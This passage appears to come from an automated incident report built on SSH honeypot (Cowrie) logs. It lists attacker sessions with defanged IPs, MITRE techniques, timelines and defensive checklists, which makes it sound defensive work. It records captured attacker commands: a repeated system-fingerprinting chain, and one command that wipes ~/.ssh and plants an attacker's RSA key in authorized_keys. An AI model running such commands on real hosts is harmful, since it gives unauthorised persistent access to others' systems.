| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 15:22:09` | `cowrie.session.connect` |
| `2026-08-10 15:22:09` | `cowrie.client.version` |
| `2026-08-10 15:22:09` | `cowrie.client.kex` |
| `2026-08-10 15:22:09` | `cowrie.login.success` |
| `2026-08-10 15:22:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.144.233[.]139` to AbuseIPDB if not already reported
- [ ] Block `45.144.233[.]139` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d78cd0b84e13

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-10 15:22 |
| **Last Seen** | 2026-08-10 15:22 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 15:22:18` | `cowrie.session.connect` |
| `2026-08-10 15:22:19` | `cowrie.client.version` |
| `2026-08-10 15:22:19` | `cowrie.client.kex` |
| `2026-08-10 15:22:20` | `cowrie.login.success` |
| `2026-08-10 15:22:21` | `cowrie.session.params` |
| `2026-08-10 15:22:21` | `cowrie.command.input` |
| `2026-08-10 15:22:21` | `cowrie.command.input` |
| `2026-08-10 15:22:21` | `cowrie.command.input` |
| `2026-08-10 15:22:21` | `cowrie.command.input` |
| `2026-08-10 15:22:21` | `cowrie.command.input` |
| `2026-08-10 15:22:21` | `cowrie.command.success` |
| `2026-08-10 15:22:21` | `cowrie.command.input` |
| `2026-08-10 15:22:21` | `cowrie.command.input` |
| `2026-08-10 15:22:21` | `cowrie.command.input` |
| `2026-08-10 15:22:21` | `cowrie.command.input` |
| `2026-08-10 15:22:22` | `cowrie.log.closed` |
| `2026-08-10 15:22:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d46fd821a1ab

| Field | Detail |
|---|---|
| **Source IP** | `196.188.93[.]169` |
| **First Seen** | 2026-08-10 15:23 |
| **Last Seen** | 2026-08-10 15:23 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 15:23:04` | `cowrie.session.connect` |
| `2026-08-10 15:23:05` | `cowrie.client.version` |
| `2026-08-10 15:23:05` | `cowrie.client.kex` |
| `2026-08-10 15:23:06` | `cowrie.login.success` |
| `2026-08-10 15:23:06` | `cowrie.direct-tcpip.request` |
| `2026-08-10 15:23:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.188.93[.]169` to AbuseIPDB if not already reported
- [ ] Block `196.188.93[.]169` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bfcc0fe31ca5

| Field | Detail |
|---|---|
| **Source IP** | `92.126.223[.]175` |
| **First Seen** | 2026-08-10 15:23 |
| **Last Seen** | 2026-08-10 15:23 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 15:23:15` | `cowrie.session.connect` |
| `2026-08-10 15:23:16` | `cowrie.client.version` |
| `2026-08-10 15:23:16` | `cowrie.client.kex` |
| `2026-08-10 15:23:17` | `cowrie.login.success` |
| `2026-08-10 15:23:17` | `cowrie.direct-tcpip.request` |
| `2026-08-10 15:23:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.126.223[.]175` to AbuseIPDB if not already reported
- [ ] Block `92.126.223[.]175` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6d67db7cc8fb

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-10 15:24 |
| **Last Seen** | 2026-08-10 15:24 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 15:24:18` | `cowrie.session.connect` |
| `2026-08-10 15:24:19` | `cowrie.client.version` |
| `2026-08-10 15:24:19` | `cowrie.client.kex` |
| `2026-08-10 15:24:21` | `cowrie.login.success` |
| `2026-08-10 15:24:23` | `cowrie.session.params` |
| `2026-08-10 15:24:23` | `cowrie.command.input` |
| `2026-08-10 15:24:23` | `cowrie.command.input` |
| `2026-08-10 15:24:23` | `cowrie.command.input` |
| `2026-08-10 15:24:23` | `cowrie.command.input` |
| `2026-08-10 15:24:23` | `cowrie.command.input` |
| `2026-08-10 15:24:23` | `cowrie.command.success` |
| `2026-08-10 15:24:23` | `cowrie.command.input` |
| `2026-08-10 15:24:23` | `cowrie.command.input` |
| `2026-08-10 15:24:23` | `cowrie.command.input` |
| `2026-08-10 15:24:23` | `cowrie.command.input` |
| `2026-08-10 15:24:24` | `cowrie.log.closed` |
| `2026-08-10 15:24:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ad45e48b8e65

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-10 15:26 |
| **Last Seen** | 2026-08-10 15:26 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 15:26:14` | `cowrie.session.connect` |
| `2026-08-10 15:26:15` | `cowrie.client.version` |
| `2026-08-10 15:26:15` | `cowrie.client.kex` |
| `2026-08-10 15:26:16` | `cowrie.login.success` |
| `2026-08-10 15:26:18` | `cowrie.session.params` |
| `2026-08-10 15:26:18` | `cowrie.command.input` |
| `2026-08-10 15:26:18` | `cowrie.command.input` |
| `2026-08-10 15:26:18` | `cowrie.command.input` |
| `2026-08-10 15:26:18` | `cowrie.command.input` |
| `2026-08-10 15:26:18` | `cowrie.command.input` |
| `2026-08-10 15:26:18` | `cowrie.command.success` |
| `2026-08-10 15:26:18` | `cowrie.command.input` |
| `2026-08-10 15:26:18` | `cowrie.command.input` |
| `2026-08-10 15:26:18` | `cowrie.command.input` |
| `2026-08-10 15:26:18` | `cowrie.command.input` |
| `2026-08-10 15:26:18` | `cowrie.log.closed` |
| `2026-08-10 15:26:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e8da9d1869f7

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-10 15:30 |
| **Last Seen** | 2026-08-10 15:30 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 15:30:11` | `cowrie.session.connect` |
| `2026-08-10 15:30:11` | `cowrie.client.version` |
| `2026-08-10 15:30:11` | `cowrie.client.kex` |
| `2026-08-10 15:30:12` | `cowrie.login.success` |
| `2026-08-10 15:30:12` | `cowrie.session.params` |
| `2026-08-10 15:30:12` | `cowrie.command.input` |
| `2026-08-10 15:30:12` | `cowrie.command.input` |
| `2026-08-10 15:30:12` | `cowrie.command.input` |
| `2026-08-10 15:30:12` | `cowrie.command.input` |
| `2026-08-10 15:30:12` | `cowrie.command.input` |
| `2026-08-10 15:30:12` | `cowrie.command.success` |
| `2026-08-10 15:30:12` | `cowrie.command.input` |
| `2026-08-10 15:30:12` | `cowrie.command.input` |
| `2026-08-10 15:30:12` | `cowrie.command.input` |
| `2026-08-10 15:30:12` | `cowrie.command.input` |
| `2026-08-10 15:30:13` | `cowrie.log.closed` |
| `2026-08-10 15:30:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-abe79cc4a358

| Field | Detail |
|---|---|
| **Source IP** | `111.53.131[.]79` |
| **First Seen** | 2026-08-10 15:31 |
| **Last Seen** | 2026-08-10 15:31 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 15:31:31` | `cowrie.session.connect` |
| `2026-08-10 15:31:32` | `cowrie.client.version` |
| `2026-08-10 15:31:32` | `cowrie.client.kex` |
| `2026-08-10 15:31:36` | `cowrie.login.success` |
| `2026-08-10 15:31:37` | `cowrie.direct-tcpip.request` |
| `2026-08-10 15:31:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.53.131[.]79` to AbuseIPDB if not already reported
- [ ] Block `111.53.131[.]79` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-75ccd3f97a5c

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-10 15:32 |
| **Last Seen** | 2026-08-10 15:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 15:32:19` | `cowrie.session.connect` |
| `2026-08-10 15:32:19` | `cowrie.client.version` |
| `2026-08-10 15:32:19` | `cowrie.client.kex` |
| `2026-08-10 15:32:20` | `cowrie.login.success` |
| `2026-08-10 15:32:20` | `cowrie.session.params` |
| `2026-08-10 15:32:20` | `cowrie.command.input` |
| `2026-08-10 15:32:20` | `cowrie.command.input` |
| `2026-08-10 15:32:20` | `cowrie.command.input` |
| `2026-08-10 15:32:20` | `cowrie.command.input` |
| `2026-08-10 15:32:20` | `cowrie.command.input` |
| `2026-08-10 15:32:20` | `cowrie.command.success` |
| `2026-08-10 15:32:20` | `cowrie.command.input` |
| `2026-08-10 15:32:20` | `cowrie.command.input` |
| `2026-08-10 15:32:20` | `cowrie.command.input` |
| `2026-08-10 15:32:20` | `cowrie.command.input` |
| `2026-08-10 15:32:21` | `cowrie.log.closed` |
| `2026-08-10 15:32:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c6d9455a1ed8

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-10 15:34 |
| **Last Seen** | 2026-08-10 15:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 15:34:46` | `cowrie.session.connect` |
| `2026-08-10 15:34:46` | `cowrie.client.version` |
| `2026-08-10 15:34:46` | `cowrie.client.kex` |
| `2026-08-10 15:34:46` | `cowrie.login.success` |
| `2026-08-10 15:34:47` | `cowrie.session.params` |
| `2026-08-10 15:34:47` | `cowrie.command.input` |
| `2026-08-10 15:34:47` | `cowrie.command.input` |
| `2026-08-10 15:34:47` | `cowrie.command.input` |
| `2026-08-10 15:34:47` | `cowrie.command.input` |
| `2026-08-10 15:34:47` | `cowrie.command.input` |
| `2026-08-10 15:34:47` | `cowrie.command.success` |
| `2026-08-10 15:34:47` | `cowrie.command.input` |
| `2026-08-10 15:34:47` | `cowrie.command.input` |
| `2026-08-10 15:34:47` | `cowrie.command.input` |
| `2026-08-10 15:34:47` | `cowrie.command.input` |
| `2026-08-10 15:34:47` | `cowrie.log.closed` |
| `2026-08-10 15:34:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c21f82bd9f77

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-10 15:36 |
| **Last Seen** | 2026-08-10 15:37 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 15:36:58` | `cowrie.session.connect` |
| `2026-08-10 15:36:59` | `cowrie.client.version` |
| `2026-08-10 15:36:59` | `cowrie.client.kex` |
| `2026-08-10 15:37:01` | `cowrie.login.success` |
| `2026-08-10 15:37:02` | `cowrie.session.params` |
| `2026-08-10 15:37:02` | `cowrie.command.input` |
| `2026-08-10 15:37:02` | `cowrie.command.input` |
| `2026-08-10 15:37:02` | `cowrie.command.input` |
| `2026-08-10 15:37:02` | `cowrie.command.input` |
| `2026-08-10 15:37:02` | `cowrie.command.input` |
| `2026-08-10 15:37:02` | `cowrie.command.success` |
| `2026-08-10 15:37:02` | `cowrie.command.input` |
| `2026-08-10 15:37:02` | `cowrie.command.input` |
| `2026-08-10 15:37:02` | `cowrie.command.input` |
| `2026-08-10 15:37:02` | `cowrie.command.input` |
| `2026-08-10 15:37:03` | `cowrie.log.closed` |
| `2026-08-10 15:37:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ecd7125e9d33

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-10 15:38 |
| **Last Seen** | 2026-08-10 15:39 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 15:38:58` | `cowrie.session.connect` |
| `2026-08-10 15:38:58` | `cowrie.client.version` |
| `2026-08-10 15:38:58` | `cowrie.client.kex` |
| `2026-08-10 15:39:00` | `cowrie.login.success` |
| `2026-08-10 15:39:01` | `cowrie.session.params` |
| `2026-08-10 15:39:01` | `cowrie.command.input` |
| `2026-08-10 15:39:01` | `cowrie.command.input` |
| `2026-08-10 15:39:01` | `cowrie.command.input` |
| `2026-08-10 15:39:01` | `cowrie.command.input` |
| `2026-08-10 15:39:01` | `cowrie.command.input` |
| `2026-08-10 15:39:01` | `cowrie.command.success` |
| `2026-08-10 15:39:01` | `cowrie.command.input` |
| `2026-08-10 15:39:01` | `cowrie.command.input` |
| `2026-08-10 15:39:01` | `cowrie.command.input` |
| `2026-08-10 15:39:01` | `cowrie.command.input` |
| `2026-08-10 15:39:01` | `cowrie.log.closed` |
| `2026-08-10 15:39:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a0aa20086d9d

| Field | Detail |
|---|---|
| **Source IP** | `37.77.150[.]241` |
| **First Seen** | 2026-08-10 15:40 |
| **Last Seen** | 2026-08-10 15:40 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 15:40:35` | `cowrie.session.connect` |
| `2026-08-10 15:40:35` | `cowrie.client.version` |
| `2026-08-10 15:40:36` | `cowrie.client.kex` |
| `2026-08-10 15:40:36` | `cowrie.login.success` |
| `2026-08-10 15:40:37` | `cowrie.session.params` |
| `2026-08-10 15:40:37` | `cowrie.command.input` |
| `2026-08-10 15:40:37` | `cowrie.command.failed` |
| `2026-08-10 15:40:37` | `cowrie.log.closed` |
| `2026-08-10 15:40:38` | `cowrie.session.params` |
| `2026-08-10 15:40:38` | `cowrie.command.input` |
| `2026-08-10 15:40:38` | `cowrie.session.file_download` |
| `2026-08-10 15:40:38` | `cowrie.log.closed` |
| `2026-08-10 15:40:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `37.77.150[.]241` to AbuseIPDB if not already reported
- [ ] Block `37.77.150[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ac747d2abb58

| Field | Detail |
|---|---|
| **Source IP** | `37.77.150[.]241` |
| **First Seen** | 2026-08-10 15:40 |
| **Last Seen** | 2026-08-10 15:40 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 15:40:38` | `cowrie.session.connect` |
| `2026-08-10 15:40:38` | `cowrie.client.version` |
| `2026-08-10 15:40:38` | `cowrie.client.kex` |
| `2026-08-10 15:40:39` | `cowrie.login.success` |
| `2026-08-10 15:40:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `37.77.150[.]241` to AbuseIPDB if not already reported
- [ ] Block `37.77.150[.]241` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0eadedde1594

| Field | Detail |
|---|---|
| **Source IP** | `37.77.150[.]241` |
| **First Seen** | 2026-08-10 15:40 |
| **Last Seen** | 2026-08-10 15:40 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 15:40:39` | `cowrie.session.connect` |
| `2026-08-10 15:40:39` | `cowrie.client.version` |
| `2026-08-10 15:40:39` | `cowrie.client.kex` |
| `2026-08-10 15:40:40` | `cowrie.login.success` |
| `2026-08-10 15:40:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `37.77.150[.]241` to AbuseIPDB if not already reported
- [ ] Block `37.77.150[.]241` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0978e7096757

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-10 15:40 |
| **Last Seen** | 2026-08-10 15:41 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 15:40:59` | `cowrie.session.connect` |
| `2026-08-10 15:40:59` | `cowrie.client.version` |
| `2026-08-10 15:40:59` | `cowrie.client.kex` |
| `2026-08-10 15:41:00` | `cowrie.login.success` |
| `2026-08-10 15:41:02` | `cowrie.session.params` |
